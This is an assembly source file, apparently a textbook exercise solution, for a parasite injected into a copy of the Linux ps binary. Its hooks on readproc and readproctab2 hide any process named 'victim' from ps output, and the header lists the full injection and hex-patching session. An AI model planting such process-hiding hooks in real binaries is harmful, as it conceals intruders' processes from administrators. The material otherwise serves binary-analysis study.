;---------------------------------+-----------------------------------------------+
; ps-parasite.s
;
; Written by Manuel Gebele (m.gebele‹ατ›tuta.io)
;
; Chapter 7, Exercise 3
;
; Preconditions/Dependencies:
; Refer to elf-parasite.s
;
; Sample session:
; $ nasm -f bin -o ps-parasite.bin ps-parasite.s
; $ cp /bin/ps ./ps-modified
; $ ./elfinject ps-modified ps-parasite.bin ".parasite" 0x800000 -1
; $ hexedit ps-modified (replace call readproc/readproctab2 instructions)
;   E822F4FFFF --> E882DF3F00 (call readproc     --> call parasite_start_address)
;   E8C2F3FFFF --> E8B1E33F00 (call readproctab2 --> call parasite_start_address +
;                                                    hijacked_readproctab2 offset)
; $ ./victim
; $ ./ps.modified
; $ ./ps.modified aux
; $ ./ps.modified -e
; $ ./ps.modified -ef
; $ ./ps.modified f (invokes readproctab2)
;---------------------------------+-----------------------------------------------+
; CODE LISTING                    | CODE COMMENT
;---------------------------------+-----------------------------------------------+
bits 64                           ; use 64-bit environment
;---------------------------------+-----------------------------------------------+
section .text                     ; .text section
;---------------------------------+-----------------------------------------------+
hijacked_readproc:                ; the hijacked readproc entry point
  push rbp                        ; prologue
  mov rbp, rsp                    ; ............
  sub rsp, 0xc                    ; [rbp-0x8] PROCTAB *ptab
                                  ; [rbp-0xc] proc_t *proc
  mov qword [rbp - 0x8], rdi      ; ptab = rdi
  mov dword [rbp - 0xc], esi      ; proc = esi
;---------------------------------+-----------------------------------------------+
next_invocation:                  ; ............
  call -0x3FEB60                  ; forward original invocation (readproc)
  push rax                        ; store clobbered registers
  push rsi                        ; ............
  push rdi                        ; ............
  cmp rax, 0                      ; if (retval == NULL)
  je back_to_host                 ; true : go back to host
                                  ; false: continue
  mov rdi, rax                    ; rdi = rax (1-st argument)
  call is_target_proc             ; ............
  cmp rax, 0                      ; if (retval == target)
  je ignore_proc                  ; true : ignore this proc_t
  jmp back_to_host                ; false: go back to host
;---------------------------------+-----------------------------------------------+
ignore_proc:                      ; hides proc (retval) by invoking readproc again
  add rsp, 0x18                   ; adjust stack pointer
  mov rdi, qword [rbp - 0x8]      ; rdi = ptab
  mov esi, dword [rbp - 0xc]      ; esi = proc
  jmp next_invocation             ; ............
;---------------------------------+-----------------------------------------------+
back_to_host:                     ; transfer control back to the host binary
  pop rdi                         ; Restore registers
  pop rsi                         ; ............
  pop rax                         ; ............
  leave                           ; epilogue
  ret                             ; return
;---------------------------------+-----------------------------------------------+
hijacked_readproctab2:            ; the hijacked readproctab2 entry point
  push rbp                        ; prologue
  mov rbp, rsp                    ; ............
  sub rsp, 0x1c                   ; [rbp-0x8 ] proc_data_t *retval
                                  ; [rbp-0x10] proc_t *proc
                                  ; [rbp-0x14] int i
                                  ; [rbp-0x18] int proc_cnt
                                  ; [rbp-0x1c] int index
  mov qword [rbp - 0x8 ], 0       ; retval = NULL
  mov qword [rbp - 0x10], 0       ; proc = NULL
  mov dword [rbp - 0x14], -1      ; i = -1
  mov dword [rbp - 0x18], 0       ; proc_cnt = 0
  mov dword [rbp - 0x1c], 0       ; index = 0
  call -0x3FEFB0                  ; forward original invocation (readproctab2)
  mov qword [rbp - 0x8], rax      ; retval = orig_readproctab2(arg1, arg2, arg3)
  jmp loop_header                 ; ............
;---------------------------------+-----------------------------------------------+
loop_body:                        ; ............
  mov rax, qword [rbp - 0x8 ]     ; rax = retval
  mov rax, qword [rax]            ; rax = retval->tab
  mov edx, dword [rbp - 0x14]     ; edx = i
  mov rax, qword [rax + rdx * 8]  ; rax = retval->tab[i] (proc[i])
  mov qword [rbp - 0x10], rax     ; proc = rax
  mov rdi, rax                    ; rdi = rax (proc)
  call is_target_proc             ; ............
  cmp rax, 0                      ; if (retval->tab[i] == target)
  jne calc_index                  ; false: collect retval->tab[i]
                                  ; true : ignore retval->tab[i]
  add dword [rbp - 0x18], 1       ; proc_cnt++
  jmp loop_header                 ; continue
;---------------------------------+-----------------------------------------------+
calc_index:                       ; ............
  mov eax, dword [rbp - 0x14]     ; eax = i
  sub eax, dword [rbp - 0x18]     ; eax = eax - proc_cnt
  mov dword [rbp - 0x1c], eax     ; index = eax
  cmp dword [rbp - 0x1c], 0x7fff  ; if (index > 32767)
  jle collect_proc                ; false: collect
                                  ; true : adjust index (prevent overflow)
                                  ; Note that the overflow scenario wasn't tested
  mov dword [rbp - 0x1c], 0x7fff  ; index = 32767
;---------------------------------+-----------------------------------------------+
collect_proc:                     ; ............
  lea rax, [rel $+tab-$]          ; rax = tab
  mov rcx, qword [rbp - 0x10]     ; rcx = proc
  mov edx, dword [rbp - 0x1c]     ; edx = index
  mov qword [rax + rdx * 8], rcx  ; tab[index] = rcx
;---------------------------------+-----------------------------------------------+
loop_header:                      ; ............
  add dword [rbp - 0x14], 1       ; i++
  mov rax, qword [rbp - 0x8 ]     ; rax = retval
  mov eax, dword [rax + 0x18]     ; eax = retval->n
  cmp eax, dword [rbp - 0x14]     ; if (retval->n > i)
  jg loop_body                    ; false: continue loop
                                  ; true : leave loop
  mov rax, qword [rbp - 0x8 ]     ; rax = retval
  mov eax, dword [rax + 0x18]     ; eax = retval->n
  sub eax, dword [rbp - 0x18]     ; eax = retval->n - proc_cnt
  mov edx, eax                    ; edx = eax
  mov rax, qword [rbp - 0x8 ]     ; rax = retval
  mov dword [rax + 0x18], edx     ; retval->n = edx
  lea rdx, [rel $+tab-$]          ; rdx = tab
  mov qword [rax], rdx            ; retval->tab = tab
  leave                           ; epilogue
  ret                             ; return
;---------------------------------+-----------------------------------------------+
is_target_proc:                   ; ............
  cmp qword [rdi + 0x1c0], 0      ; if (NULL == cmdline)
  je read_cmd                     ; true : read cmd
                                  ; false: use cmdline
  mov rdi, qword [rdi + 0x1c0]    ; rdi = proc_t->cmdline
  mov rdi, qword [rdi]            ; rdi = cmdline[0]
  jmp compare_proc_name1          ; ............
;---------------------------------+-----------------------------------------------+
read_cmd:                         ; ............
  add rdi, 744                    ; rdi = proc_t->cmd (max 16 bytes)
;---------------------------------+-----------------------------------------------+
compare_proc_name1:               ; ............
  mov rax, rdi                    ; rax = rdi (may needed for second compare)
  lea rsi, [rel $+proc_name1-$]   ; rsi = proc_name1
  mov rcx, proc_name1_len         ; rcx = proc_name1_len
  cld                             ; compare in forward direction
  repe cmpsb                      ; do the comparision...
  cmp rcx, 0                      ; if (cmd|cmdline == proc_name1)
  jne compare_proc_name2          ; false: compare_proc_name2
  jmp return                      ; true : leave
;---------------------------------+-----------------------------------------------+
compare_proc_name2:               ; ............
  mov rdi, rax                    ; rdi = rax (re-point to the first byte) 
  lea rsi, [rel $+proc_name2-$]   ; rsi = proc_name2
  mov rcx, proc_name2_len         ; rcx = proc_name2_len
  cld                             ; compare in forward direction
  repe cmpsb                      ; do the comparision...
;---------------------------------+-----------------------------------------------+
return:                           ; ............
  mov rax, rcx                    ; save return value
  ret                             ; return
;---------------------------------+-----------------------------------------------+
section .data                     ; .data section
;---------------------------------+-----------------------------------------------+
proc_name1     db 'victim', 0x0   ; target process name _without_ path prefix
proc_name1_len equ $-proc_name1   ; length of proc_name1
proc_name2     db './victim', 0x0 ; target process name _with_ path prefix
proc_name2_len equ $-proc_name2   ; length of proc_name2
;---------------------------------+-----------------------------------------------+
section .bss                      ; .bss section
;---------------------------------+-----------------------------------------------+
tab resq  32768                   ; holds pointers of proc_t structs
;---------------------------------+-----------------------------------------------+